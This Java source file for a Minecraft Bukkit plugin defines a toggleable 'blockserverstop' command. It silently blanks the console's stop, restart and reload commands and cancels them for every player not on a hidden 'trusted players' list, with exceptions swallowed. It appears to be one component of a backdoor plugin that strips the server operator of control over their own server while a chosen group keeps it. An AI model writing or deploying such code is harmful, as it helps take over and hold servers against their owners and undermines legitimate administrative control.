package de.Garkolym.Commands.Server;

import de.Garkolym.Commands.Command;
import de.Garkolym.Commands.CommandCategory;
import de.Garkolym.Start;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.ServerCommandEvent;

import java.util.ArrayList;

/**
 * Created by GalaxyHD on 30.05.2016.
 */
public class CommandBlockServerStop extends Command implements Listener{

    private boolean isActive = false;
    
    public CommandBlockServerStop() {
        super("blockserverstop", CommandCategory.SERVER);
        Bukkit.getPluginManager().registerEvents(this, Start.instance);
    }

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        isActive = !isActive;
        p.sendMessage(Start.instance.prefix + ((isActive) ? "§aServer kann nun nicht mehr gestopp werden!" : "§cServer freigegeben!"));
    }

    @EventHandler
    public void on(ServerCommandEvent e) {
    	try {
        	String command = e.getCommand().split(" ")[0];
            if(!isActive) return;
            if ((command.equalsIgnoreCase("stop") || command.equalsIgnoreCase("restart" ) || command.equalsIgnoreCase("reload") || command.equalsIgnoreCase("rl"))) {
                e.setCommand("");
            }
		} catch (Exception e2) {
		}
    }

    @EventHandler
    public void on(PlayerCommandPreprocessEvent e) {
    	try {
        	String command = e.getMessage().split(" ")[0];
    		if (!isActive) {
    			return;			
    		}
    		if (Start.instance.getTrustedPlayers().contains(e.getPlayer().getName())) {
    			return;
    		}
    		if ((command.equalsIgnoreCase("/" + "stop") || command.equalsIgnoreCase("/" + "restart") || command.equalsIgnoreCase("/" + "reload") || command.equalsIgnoreCase("/" + "rl"))) {
    			e.setCancelled(true);
    		}

		} catch (Exception e2) {
		}
	}

}
